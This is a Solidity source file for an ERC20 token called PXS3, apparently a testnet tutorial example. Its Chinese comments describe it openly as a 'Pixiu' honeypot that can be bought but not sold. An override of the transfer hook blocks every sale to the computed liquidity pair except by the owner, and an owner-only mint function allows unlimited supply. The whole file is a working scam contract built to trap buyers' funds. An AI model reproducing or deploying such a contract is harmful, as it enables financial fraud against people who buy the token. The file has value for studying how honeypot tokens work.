// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// 极简貔貅ERC20代币，只能买，不能卖
contract HoneyPotSepolia is ERC20, Ownable {
    address public pair;

    // 构造函数：初始化代币名称和代号
    constructor() ERC20("PXS3", "PXS3") Ownable(msg.sender){
        pair = defaultPair();
    }

    function decimals() public view virtual override returns (uint8) {
        return 2;
    }

    function defaultPair() internal view returns(address){
        //address factory = 0xB7f907f7A9eBC822a80BD25E224be42Ce0A698A0;
        address factory = 0xF62c03E08ada871A0bEb309762E260a7a6a880E6; 
        address tokenA = address(this); // PIX3
        address tokenB = 0xD94F8eFF244D741F9C583ea04238ab7b86B6BaE5;
        return createPair(factory, tokenA, tokenB, 0);
    }

    function createPair(address factory, address tokenA, address tokenB, bytes32 initCodeHash) public pure returns(address){
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
        if(initCodeHash <= 0){
          initCodeHash = 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f;
        }
        // calculate pair address
        return address(uint160(uint(keccak256(abi.encodePacked(
          hex"ff",
          factory,
          salt,
          initCodeHash
        )))));
    }

    /**
     * 铸造函数，只有合约所有者可以调用
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

  /**
     * @dev See {ERC20-_update}.
     * 貔貅函数：只有合约拥有者可以卖出
    */
    function _update(
      address from,
      address to,
      uint256 amount
  ) internal virtual override  {
     if(to == pair){
        require(from == owner(), "Can not Transfer");
      }
      super._update(from, to, amount);
  }
}